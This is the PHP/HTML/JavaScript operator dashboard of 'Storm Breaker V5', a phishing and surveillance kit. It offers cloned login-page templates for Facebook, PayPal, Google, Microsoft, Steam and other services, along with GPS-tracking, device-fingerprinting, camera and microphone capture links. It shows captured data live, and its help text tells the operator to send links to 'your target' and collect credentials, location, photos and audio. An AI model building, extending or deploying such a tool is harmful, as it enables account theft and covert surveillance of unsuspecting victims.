<?php
session_start();
include "./assets/components/login-arc.php";

if(isset($_COOKIE['logindata']) && $_COOKIE['logindata'] == $key['token'] && $key['expired'] == "no"){
    if(!isset($_SESSION['IAm-logined'])){
        $_SESSION['IAm-logined'] = 'yes';
    }
}
elseif(isset($_SESSION['IAm-logined'])){
    $client_token = generate_token();
    setcookie("logindata", $client_token, time() + (86400 * 30), "/");
    change_token($client_token);
}
else {
    header('location: login-v4.php');
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="./assets/css/bootstrap.min.css" rel="stylesheet">
    <link href="./assets/css/light-theme.min.css" rel="stylesheet">
    <link href="./assets/css/style.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <title>Storm Breaker - V5 Ultimate</title>
    <style>
        :root {
            --primary: #667eea;
            --secondary: #764ba2;
            --success: #2ecc71;
            --danger: #e74c3c;
            --warning: #f39c12;
            --info: #3498db;
        }
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            padding: 20px;
        }
        body.dark-mode {
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
        }
        body.dark-mode .dashboard-card { background: #2d2d44; color: #fff; border-color: #3d3d5c; }
        body.dark-mode textarea, body.dark-mode input, body.dark-mode select {
            background: #1a1a2e; color: #fff; border-color: #3d3d5c;
        }
        .header-bar {
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(10px);
            border-radius: 15px;
            padding: 20px 30px;
            margin-bottom: 30px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 15px;
        }
        body.dark-mode .header-bar { background: rgba(45, 45, 68, 0.95); }
        body.dark-mode .logo-section p { color: #aaa!important; }
        .logo-section h1 {
            margin: 0;
            color: var(--primary);
            font-size: 2rem;
            font-weight: bold;
        }
        .stats-container {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }
        .stat-card {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            border-radius: 15px;
            padding: 20px;
            color: white;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
            transition: transform 0.3s ease;
            cursor: pointer;
        }
        .stat-card:hover { transform: translateY(-5px); }
        .stat-card i { font-size: 2rem; margin-bottom: 10px; }
        .stat-card h3 { margin: 0; font-size: 1.8rem; font-weight: bold; }
        .stat-card p { margin: 5px 0 0 0; opacity: 0.9; font-size: 0.9rem; }
        .dashboard-card {
            background: white;
            border-radius: 15px;
            padding: 25px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
            margin-bottom: 20px;
        }
        body.dark-mode .dashboard-card h3 { color: #fff; }
        .btn-modern {
            border: none;
            border-radius: 10px;
            padding: 10px 20px;
            font-weight: 600;
            transition: all 0.3s ease;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
            cursor: pointer;
        }
        .btn-modern:hover { transform: translateY(-2px); }
        .btn-primary-modern { background: linear-gradient(135deg, #3498db 0%, #2980b9 100%); color: white; }
        .btn-success-modern { background: linear-gradient(135deg, #2ecc71 0%, #27ae60 100%); color: white; }
        .btn-danger-modern { background: linear-gradient(135deg, #e74c3c 0%, #c0392b 100%); color: white; }
        .btn-warning-modern { background: linear-gradient(135deg, #f39c12 0%, #e67e22 100%); color: white; }
        .btn-secondary-modern { background: linear-gradient(135deg, #95a5a6 0%, #7f8c8d 100%); color: white; }
        .control-panel {
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
            justify-content: center;
            margin-top: 20px;
        }
        .link-card {
            background: white;
            border-radius: 10px;
            padding: 15px;
            margin-bottom: 15px;
            border: 2px solid #e0e0e0;
            display: flex;
            align-items: center;
            justify-content: space-between;
            transition: all 0.3s ease;
        }
        body.dark-mode .link-card { background: #2d2d44; border-color: #3d3d5c; }
        .link-card:hover { border-color: var(--primary); box-shadow: 0 4px 12px rgba(102, 126, 234, 0.2); }
        .link-text {
            flex-grow: 1;
            padding: 10px;
            font-family: 'Courier New', monospace;
            color: var(--primary);
            word-break: break-all;
        }
        textarea#result {
            border: 2px solid #e0e0e0;
            border-radius: 10px;
            padding: 15px;
            font-family: 'Courier New', monospace;
            width: 100%;
        }
        .badge-status {
            padding: 5px 15px;
            border-radius: 20px;
            font-size: 0.85rem;
            font-weight: 600;
        }
        .badge-online { background: #2ecc71; color: white; }
        .badge-offline { background: #e74c3c; color: white; }
        .theme-toggle {
            background: rgba(255, 255, 255, 0.2);
            border: none;
            border-radius: 50px;
            padding: 10px 20px;
            cursor: pointer;
        }
        .filter-controls {
            display: flex;
            gap: 10px;
            margin-bottom: 15px;
            flex-wrap: wrap;
        }
        .filter-controls input, .filter-controls select {
            padding: 8px 15px;
            border: 2px solid #e0e0e0;
            border-radius: 8px;
        }
        .quick-stats {
            display: flex;
            gap: 15px;
            justify-content: space-around;
            padding: 15px;
            background: #f8f9fa;
            border-radius: 10px;
            margin-bottom: 20px;
        }
        body.dark-mode .quick-stats { background: #1a1a2e; }
        .quick-stat-item {
            text-align: center;
        }
        .quick-stat-item .value {
            font-size: 1.5rem;
            font-weight: bold;
            color: var(--primary);
        }
        .quick-stat-item .label {
            font-size: 0.85rem;
            color: #666;
        }
        body.dark-mode .quick-stat-item .label { color: #aaa; }
        
        /* Modal Styles */
        .modal-overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.7);
            backdrop-filter: blur(5px);
            z-index: 9999;
            animation: fadeIn 0.3s ease;
        }
        
        .modal-overlay.active {
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .modal-container {
            background: white;
            border-radius: 20px;
            max-width: 90%;
            max-height: 90vh;
            overflow-y: auto;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            animation: slideUp 0.3s ease;
            position: relative;
        }
        
        body.dark-mode .modal-container {
            background: #2d2d44;
            color: #fff;
        }
        
        .modal-header {
            padding: 25px 30px;
            border-bottom: 2px solid #e0e0e0;
            display: flex;
            justify-content: space-between;
            align-items: center;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            border-radius: 20px 20px 0 0;
            color: white;
        }
        
        body.dark-mode .modal-header {
            border-color: #3d3d5c;
        }
        
        .modal-header h2 {
            margin: 0;
            font-size: 1.5rem;
        }
        
        .modal-close {
            background: rgba(255, 255, 255, 0.2);
            border: none;
            color: white;
            font-size: 1.5rem;
            width: 40px;
            height: 40px;
            border-radius: 50%;
            cursor: pointer;
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .modal-close:hover {
            background: rgba(255, 255, 255, 0.3);
            transform: rotate(90deg);
        }
        
        .modal-body {
            padding: 30px;
        }
        
        .modal-footer {
            padding: 20px 30px;
            border-top: 2px solid #e0e0e0;
            display: flex;
            justify-content: flex-end;
            gap: 10px;
        }
        
        body.dark-mode .modal-footer {
            border-color: #3d3d5c;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }
        
        @keyframes slideUp {
            from {
                opacity: 0;
                transform: translateY(50px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
        
        .modal-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 15px;
            margin: 20px 0;
        }
        
        .modal-card {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 10px;
            border: 2px solid #e0e0e0;
            transition: all 0.3s ease;
            cursor: pointer;
        }
        
        body.dark-mode .modal-card {
            background: #1a1a2e;
            border-color: #3d3d5c;
        }
        
        .modal-card:hover {
            border-color: var(--primary);
            transform: translateY(-3px);
            box-shadow: 0 8px 20px rgba(102, 126, 234, 0.2);
        }
        
        .modal-card h4 {
            margin: 0 0 10px 0;
            color: var(--primary);
        }
        
        body.dark-mode .modal-card h4 {
            color: #fff;
        }
        
        .modal-card p {
            margin: 0;
            color: #666;
            font-size: 0.9rem;
        }
        
        body.dark-mode .modal-card p {
            color: #aaa;
        }
        
        .template-list {
            max-height: 400px;
            overflow-y: auto;
        }
        
        .template-item {
            background: #f8f9fa;
            padding: 15px;
            margin-bottom: 10px;
            border-radius: 10px;
            border: 2px solid #e0e0e0;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        body.dark-mode .template-item {
            background: #1a1a2e;
            border-color: #3d3d5c;
        }
        
        .template-info {
            flex: 1;
        }
        
        .template-info h4 {
            margin: 0 0 5px 0;
            color: #333;
        }
        
        body.dark-mode .template-info h4 {
            color: #fff;
        }
        
        .template-info p {
            margin: 0;
            font-size: 0.85rem;
            color: #666;
        }
        
        body.dark-mode .template-info p {
            color: #aaa;
        }
        
        @media (max-width: 768px) {
            .header-bar { flex-direction: column; }
            .stats-container { grid-template-columns: 1fr; }
            .modal-container { max-width: 95%; }
            .modal-body { padding: 20px; }
        }
    </style>
</head>

<body id="ourbody" onload="check_new_version(); initializeStats();">

    <div class="header-bar">
        <div class="logo-section">
            <h1><i class="fas fa-bolt"></i> Storm Breaker V5</h1>
            <p style="margin: 0; color: #666;">Ultimate Security Testing Platform</p>
        </div>
        <div style="display: flex; gap: 10px; align-items: center; flex-wrap: wrap;">
            <span class="badge-status badge-online" id="listener-status">
                <i class="fas fa-circle"></i> Active
            </span>
            <button class="theme-toggle" onclick="toggleTheme()" title="Dark Mode">
                <i class="fas fa-moon" id="theme-icon"></i>
            </button>
            <button class="btn btn-danger btn-modern" onclick="if(confirm('Logout?')) location.href='login-v4.php'">
                <i class="fas fa-sign-out-alt"></i>
            </button>
        </div>
    </div>

    <div class="stats-container">
        <div class="stat-card" onclick="updateStats()">
            <i class="fas fa-link"></i>
            <h3 id="total-links">0</h3>
            <p>Active Templates</p>
        </div>
        <div class="stat-card" style="background: linear-gradient(135deg, #2ecc71 0%, #27ae60 100%);" onclick="showAnalytics()">
            <i class="fas fa-chart-bar"></i>
            <h3 id="analytics-total">0</h3>
            <p>Total Captures</p>
        </div>
        <div class="stat-card" style="background: linear-gradient(135deg, #f39c12 0%, #e67e22 100%);">
            <i class="fas fa-clock"></i>
            <h3 id="session-time">00:00</h3>
            <p>Session Time</p>
        </div>
        <div class="stat-card" style="background: linear-gradient(135deg, #e74c3c 0%, #c0392b 100%);" onclick="showTimeline()">
            <i class="fas fa-history"></i>
            <h3 id="recent-activity">0</h3>
            <p>Recent Events</p>
        </div>
        <div class="stat-card" style="background: linear-gradient(135deg, #9b59b6 0%, #8e44ad 100%);">
            <i class="fas fa-calendar-day"></i>
            <h3 id="analytics-today">0</h3>
            <p>Today's Logs</p>
        </div>
        <div class="stat-card" style="background: linear-gradient(135deg, #3498db 0%, #2980b9 100%);">
            <i class="fas fa-hourglass-half"></i>
            <h3 id="analytics-hour">0</h3>
            <p>This Hour</p>
        </div>
    </div>

    <div class="dashboard-card">
        <h3><i class="fas fa-link"></i> Phishing Templates</h3>
        <p style="color: #666; margin-bottom: 20px;">Available attack vectors - Click to copy link</p>
        
        <!-- Quick Action Buttons -->
        <div style="display: flex; gap: 10px; margin-bottom: 20px; flex-wrap: wrap;">
            <button class="btn-primary-modern btn-modern" onclick="location.href='gallery.php'">
                <i class="fas fa-images"></i> View Image Gallery
            </button>
            <button class="btn-success-modern btn-modern" onclick="checkCapturedData()">
                <i class="fas fa-database"></i> View All Captures
            </button>
            <button class="btn-warning-modern btn-modern" onclick="generateNewLink()">
                <i class="fas fa-plus"></i> Generate New Link
            </button>
        </div>
        
        <div id="links"></div>
    </div>

    <div class="dashboard-card">
        <h3><i class="fas fa-terminal"></i> Live Monitoring</h3>
        
        <div class="quick-stats">
            <div class="quick-stat-item">
                <div class="value" id="total-logs">0</div>
                <div class="label">Total Logs</div>
            </div>
            <div class="quick-stat-item">
                <div class="value" id="log-rate">0/min</div>
                <div class="label">Capture Rate</div>
            </div>
            <div class="quick-stat-item">
                <div class="value" id="success-rate">0%</div>
                <div class="label">Success Rate</div>
            </div>
        </div>
        
        <div class="filter-controls">
            <input type="text" id="search-logs" placeholder="Search logs..." style="flex: 1; min-width: 200px;">
            <select id="filter-type">
                <option value="all">All Types</option>
                <option value="location">Location</option>
                <option value="image">Images</option>
                <option value="audio">Audio</option>
                <option value="device">Device Info</option>
                <option value="fingerprint">Fingerprint</option>
            </select>
            <button class="btn btn-primary-modern btn-modern" onclick="applyFilter()">
                <i class="fas fa-filter"></i> Filter
            </button>
        </div>

        <textarea class="form-control" placeholder="Waiting for data..." id="result" rows="12"></textarea>
        
        <div class="control-panel">
            <button class="btn-danger-modern btn-modern" id="btn-listen">
                <i class="fas fa-stop"></i> Stop
            </button>
            <button class="btn-success-modern btn-modern" id="soundToggle" onclick="toggleSound()">
                <i class="fas fa-volume-up"></i> Sound On
            </button>
            <button class="btn-primary-modern btn-modern" onclick="location.href='gallery.php'">
                <i class="fas fa-images"></i> Gallery
            </button>
            <button class="btn-primary-modern btn-modern" onclick="showTimeline()">
                <i class="fas fa-history"></i> Timeline
            </button>
            <button class="btn-primary-modern btn-modern" onclick="showAnalytics()">
                <i class="fas fa-chart-pie"></i> Analytics
            </button>
            <button class="btn-success-modern btn-modern" onclick="saveTextAsFile(result.value,'log.txt')">
                <i class="fas fa-download"></i> TXT
            </button>
            <button class="btn-success-modern btn-modern" onclick="exportJSON()">
                <i class="fas fa-file-code"></i> JSON
            </button>
            <button class="btn-warning-modern btn-modern" id="btn-clear">
                <i class="fas fa-trash"></i> Clear
            </button>
            <button class="btn-secondary-modern btn-modern" onclick="copyAllLogs()">
                <i class="fas fa-copy"></i> Copy
            </button>
        </div>
    </div>

    <div id="activityTimeline" style="display: none;"></div>

    <!-- Modal System -->
    <div id="modal-overlay" class="modal-overlay" onclick="closeModalOnOverlay(event)">
        <div class="modal-container" id="modal-content">
            <!-- Modal content will be dynamically inserted here -->
        </div>
    </div>

</body>
</html>

<script src="./assets/js/jquery.min.js"></script>
<script src="./assets/js/script.js"></script>
<script src="./assets/js/sweetalert2.min.js"></script>
<script src="./assets/js/growl-notification.min.js"></script>
<script src="./assets/js/enhanced-features.js"></script>
<script src="./assets/js/advanced-features.js"></script>

<script>
// Modal System
function openModal(title, content, footer = '') {
    const overlay = document.getElementById('modal-overlay');
    const modalContent = document.getElementById('modal-content');
    
    modalContent.innerHTML = `
        <div class="modal-header">
            <h2><i class="fas fa-bolt"></i> ${title}</h2>
            <button class="modal-close" onclick="closeModal()">
                <i class="fas fa-times"></i>
            </button>
        </div>
        <div class="modal-body">
            ${content}
        </div>
        ${footer ? `<div class="modal-footer">${footer}</div>` : ''}
    `;
    
    overlay.classList.add('active');
    document.body.style.overflow = 'hidden';
}

function closeModal() {
    const overlay = document.getElementById('modal-overlay');
    overlay.classList.remove('active');
    document.body.style.overflow = 'auto';
}

function closeModalOnOverlay(event) {
    if (event.target.id === 'modal-overlay') {
        closeModal();
    }
}

// ESC key to close modal
document.addEventListener('keydown', function(event) {
    if (event.key === 'Escape') {
        closeModal();
    }
});

// Additional helper functions
function checkCapturedData() {
    const content = `
        <div class="modal-grid">
            <div class="modal-card" onclick="location.href='gallery.php'">
                <i class="fas fa-images" style="font-size: 3rem; color: var(--primary); margin-bottom: 10px;"></i>
                <h4>Image Gallery</h4>
                <p>View all captured images and screenshots</p>
            </div>
            <div class="modal-card" onclick="viewAllLogs()">
                <i class="fas fa-list" style="font-size: 3rem; color: var(--success); margin-bottom: 10px;"></i>
                <h4>All Logs</h4>
                <p>View complete capture history</p>
            </div>
            <div class="modal-card" onclick="downloadAllData()">
                <i class="fas fa-download" style="font-size: 3rem; color: var(--warning); margin-bottom: 10px;"></i>
                <h4>Download Data</h4>
                <p>Export all captured data</p>
            </div>
            <div class="modal-card" onclick="showStatistics()">
                <i class="fas fa-chart-pie" style="font-size: 3rem; color: var(--info); margin-bottom: 10px;"></i>
                <h4>Statistics</h4>
                <p>View detailed statistics</p>
            </div>
        </div>
    `;
    
    openModal('Captured Data', content);
}

function generateNewLink() {
    const templates = [
        { name: 'Facebook Phish', icon: 'fab fa-facebook', desc: 'Facebook login page clone', file: 'facebook_phish' },
        { name: 'Netflix Phish', icon: 'fas fa-film', desc: 'Netflix login page clone', file: 'netflix_phish' },
        { name: 'PayPal Phish', icon: 'fab fa-paypal', desc: 'PayPal verification page', file: 'paypal_phish' },
        { name: 'Google Phish', icon: 'fab fa-google', desc: 'Google account recovery', file: 'google_phish' },
        { name: 'Microsoft Phish', icon: 'fab fa-microsoft', desc: 'Microsoft account sign-in', file: 'microsoft_phish' },
        { name: 'Instagram Phish', icon: 'fab fa-instagram', desc: 'Instagram login page', file: 'instagram_phish' },
        { name: 'Discord Phish', icon: 'fab fa-discord', desc: 'Discord verification', file: 'discord_phish' },
        { name: 'Steam Phish', icon: 'fab fa-steam', desc: 'Steam account sign-in', file: 'steam_phish' },
        { name: 'Spotify Phish', icon: 'fab fa-spotify', desc: 'Spotify login page', file: 'spotify_phish' },
        { name: 'Twitter/X Phish', icon: 'fab fa-twitter', desc: 'Twitter/X sign-in page', file: 'twitter_phish' },
        { name: 'Advanced Location', icon: 'fas fa-map-marked-alt', desc: 'GPS tracking with map', file: 'advanced_location' },
        { name: 'Device Fingerprint', icon: 'fas fa-fingerprint', desc: 'Complete device info', file: 'device_fingerprint' },
        { name: 'Camera Capture', icon: 'fas fa-camera', desc: 'Capture photos', file: 'camera_temp' },
        { name: 'Microphone', icon: 'fas fa-microphone', desc: 'Record audio', file: 'microphone' },
        { name: 'Near You', icon: 'fas fa-location-arrow', desc: 'Location with map', file: 'nearyou' }
    ];
    
    let content = '<div class="template-list">';
    templates.forEach(template => {
        content += `
            <div class="template-item">
                <div class="template-info">
                    <h4><i class="${template.icon}"></i> ${template.name}</h4>
                    <p>${template.desc}</p>
                </div>
                <button class="btn-primary-modern btn-modern" onclick="selectTemplate('${template.file}')">
                    <i class="fas fa-link"></i> Generate
                </button>
            </div>
        `;
    });
    content += '</div>';
    
    openModal('Generate Phishing Link', content);
}

function selectTemplate(templateName) {
    closeModal();
    Swal.fire({
        icon: 'info',
        title: 'Template Selected',
        html: `Template: <strong>${templateName}</strong><br>Scroll up to see the generated link in the templates section.`,
        showConfirmButton: true
    });
}

function viewAllLogs() {
    const logs = document.getElementById('result').value;
    const content = `
        <div style="background: #f8f9fa; padding: 15px; border-radius: 10px; max-height: 500px; overflow-y: auto;">
            <pre style="margin: 0; font-family: 'Courier New', monospace; white-space: pre-wrap; word-wrap: break-word;">${logs || 'No logs available'}</pre>
        </div>
        <div style="margin-top: 15px; display: flex; gap: 10px;">
            <button class="btn-success-modern btn-modern" onclick="downloadAllData()">
                <i class="fas fa-download"></i> Download
            </button>
            <button class="btn-secondary-modern btn-modern" onclick="navigator.clipboard.writeText('${logs.replace(/'/g, "\\'")}'); Swal.fire({icon: 'success', title: 'Copied!', timer: 1500})">
                <i class="fas fa-copy"></i> Copy
            </button>
        </div>
    `;
    
    closeModal();
    setTimeout(() => openModal('All Captured Logs', content), 300);
}

function downloadAllData() {
    const logs = document.getElementById('result').value;
    saveTextAsFile(logs, 'all_captures_' + new Date().toISOString().split('T')[0] + '.txt');
    Swal.fire({
        icon: 'success',
        title: 'Downloaded!',
        text: 'All data has been downloaded',
        timer: 2000
    });
}

function showStatistics() {
    const content = `
        <div class="modal-grid">
            <div class="modal-card">
                <h4><i class="fas fa-link" style="color: var(--primary);"></i> Active Templates</h4>
                <p style="font-size: 2rem; font-weight: bold; color: var(--primary);" id="modal-stat-links">0</p>
            </div>
            <div class="modal-card">
                <h4><i class="fas fa-chart-bar" style="color: var(--success);"></i> Total Captures</h4>
                <p style="font-size: 2rem; font-weight: bold; color: var(--success);" id="modal-stat-total">0</p>
            </div>
            <div class="modal-card">
                <h4><i class="fas fa-calendar-day" style="color: var(--warning);"></i> Today's Logs</h4>
                <p style="font-size: 2rem; font-weight: bold; color: var(--warning);" id="modal-stat-today">0</p>
            </div>
            <div class="modal-card">
                <h4><i class="fas fa-hourglass-half" style="color: var(--info);"></i> This Hour</h4>
                <p style="font-size: 2rem; font-weight: bold; color: var(--info);" id="modal-stat-hour">0</p>
            </div>
        </div>
        <div style="margin-top: 20px; padding: 20px; background: #f8f9fa; border-radius: 10px;">
            <h4>Session Information</h4>
            <p><strong>Session Time:</strong> <span id="modal-session-time">00:00</span></p>
            <p><strong>Capture Rate:</strong> <span id="modal-capture-rate">0/min</span></p>
            <p><strong>Success Rate:</strong> <span id="modal-success-rate">0%</span></p>
        </div>
    `;
    
    closeModal();
    setTimeout(() => {
        openModal('Detailed Statistics', content);
        // Update stats in modal
        document.getElementById('modal-stat-links').textContent = document.getElementById('total-links').textContent;
        document.getElementById('modal-stat-total').textContent = document.getElementById('analytics-total').textContent;
        document.getElementById('modal-stat-today').textContent = document.getElementById('analytics-today').textContent;
        document.getElementById('modal-stat-hour').textContent = document.getElementById('analytics-hour').textContent;
        document.getElementById('modal-session-time').textContent = document.getElementById('session-time').textContent;
        document.getElementById('modal-capture-rate').textContent = document.getElementById('log-rate').textContent;
        document.getElementById('modal-success-rate').textContent = document.getElementById('success-rate').textContent;
    }, 300);
}

// Help Modal
function showHelpModal() {
    const content = `
        <div style="text-align: left;">
            <h4><i class="fas fa-question-circle"></i> Getting Started</h4>
            <p>Storm Breaker is a security testing platform for phishing campaigns and data capture.</p>
            
            <h4 style="margin-top: 20px;"><i class="fas fa-link"></i> How to Use</h4>
            <ol>
                <li>Select a template from the available phishing pages</li>
                <li>Copy the generated link</li>
                <li>Share the link with your target</li>
                <li>Monitor captured data in real-time</li>
            </ol>
            
            <h4 style="margin-top: 20px;"><i class="fas fa-shield-alt"></i> Available Templates</h4>
            <ul>
                <li><strong>Social Media:</strong> Facebook, Instagram, Twitter, Discord</li>
                <li><strong>Services:</strong> Netflix, Spotify, PayPal</li>
                <li><strong>Accounts:</strong> Google, Microsoft, Steam</li>
                <li><strong>Advanced:</strong> Location tracker, Device fingerprint, Camera, Microphone</li>
            </ul>
            
            <h4 style="margin-top: 20px;"><i class="fas fa-database"></i> Data Captured</h4>
            <ul>
                <li>Login credentials</li>
                <li>Device information</li>
                <li>Location data with GPS coordinates</li>
                <li>Browser fingerprints</li>
                <li>Photos and audio recordings</li>
            </ul>
        </div>
    `;
    
    const footer = `
        <button class="btn-primary-modern btn-modern" onclick="closeModal()">
            <i class="fas fa-check"></i> Got it!
        </button>
    `;
    
    openModal('Help & Documentation', content, footer);
}

// Settings Modal
function showSettingsModal() {
    const content = `
        <div style="text-align: left;">
            <h4><i class="fas fa-palette"></i> Appearance</h4>
            <div style="padding: 15px; background: #f8f9fa; border-radius: 10px; margin-bottom: 20px;">
                <label style="display: flex; align-items: center; gap: 10px; cursor: pointer;">
                    <input type="checkbox" id="dark-mode-toggle" onchange="toggleTheme()" ${document.body.classList.contains('dark-mode') ? 'checked' : ''}>
                    <span>Enable Dark Mode</span>
                </label>
            </div>
            
            <h4><i class="fas fa-bell"></i> Notifications</h4>
            <div style="padding: 15px; background: #f8f9fa; border-radius: 10px; margin-bottom: 20px;">
                <label style="display: flex; align-items: center; gap: 10px; cursor: pointer; margin-bottom: 10px;">
                    <input type="checkbox" id="sound-notifications" checked>
                    <span>Sound Notifications</span>
                </label>
                <label style="display: flex; align-items: center; gap: 10px; cursor: pointer;">
                    <input type="checkbox" id="desktop-notifications">
                    <span>Desktop Notifications (requires permission)</span>
                </label>
            </div>
            
            <h4><i class="fas fa-clock"></i> Auto-Refresh</h4>
            <div style="padding: 15px; background: #f8f9fa; border-radius: 10px; margin-bottom: 20px;">
                <label>Refresh Interval (seconds):</label>
                <input type="number" value="5" min="1" max="60" style="width: 100%; padding: 8px; margin-top: 10px; border-radius: 5px; border: 1px solid #ddd;">
            </div>
            
            <h4><i class="fas fa-trash"></i> Data Management</h4>
            <div style="padding: 15px; background: #f8f9fa; border-radius: 10px;">
                <button class="btn-danger-modern btn-modern" style="width: 100%; margin-bottom: 10px;" onclick="clearAllLogs()">
                    <i class="fas fa-trash-alt"></i> Clear All Logs
                </button>
                <button class="btn-warning-modern btn-modern" style="width: 100%;" onclick="exportAllData()">
                    <i class="fas fa-file-export"></i> Export All Data
                </button>
            </div>
        </div>
    `;
    
    const footer = `
        <button class="btn-secondary-modern btn-modern" onclick="closeModal()">
            <i class="fas fa-times"></i> Close
        </button>
        <button class="btn-success-modern btn-modern" onclick="saveSettings()">
            <i class="fas fa-save"></i> Save Settings
        </button>
    `;
    
    openModal('Settings', content, footer);
}

function saveSettings() {
    Swal.fire({
        icon: 'success',
        title: 'Settings Saved!',
        text: 'Your preferences have been saved',
        timer: 2000
    });
    closeModal();
}

function clearAllLogs() {
    if (confirm('Are you sure you want to clear all logs? This cannot be undone.')) {
        document.getElementById('result').value = '';
        Swal.fire({
            icon: 'success',
            title: 'Cleared!',
            text: 'All logs have been cleared',
            timer: 2000
        });
        closeModal();
    }
}

function exportAllData() {
    const logs = document.getElementById('result').value;
    const data = {
        timestamp: new Date().toISOString(),
        logs: logs,
        stats: {
            totalLinks: document.getElementById('total-links').textContent,
            totalCaptures: document.getElementById('analytics-total').textContent,
            todayLogs: document.getElementById('analytics-today').textContent
        }
    };
    
    const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = 'storm_breaker_export_' + new Date().toISOString().split('T')[0] + '.json';
    a.click();
    
    Swal.fire({
        icon: 'success',
        title: 'Exported!',
        text: 'Data has been exported as JSON',
        timer: 2000
    });
}

// Add buttons to header for quick access
document.addEventListener('DOMContentLoaded', function() {
    const headerControls = document.querySelector('.header-bar > div:last-child');
    if (headerControls) {
        const helpBtn = document.createElement('button');
        helpBtn.className = 'btn btn-info btn-modern';
        helpBtn.innerHTML = '<i class="fas fa-question-circle"></i>';
        helpBtn.title = 'Help';
        helpBtn.onclick = showHelpModal;
        
        const settingsBtn = document.createElement('button');
        settingsBtn.className = 'btn btn-secondary btn-modern';
        settingsBtn.innerHTML = '<i class="fas fa-cog"></i>';
        settingsBtn.title = 'Settings';
        settingsBtn.onclick = showSettingsModal;
        
        headerControls.insertBefore(settingsBtn, headerControls.lastElementChild);
        headerControls.insertBefore(helpBtn, headerControls.lastElementChild);
    }
});
</script>
</script>
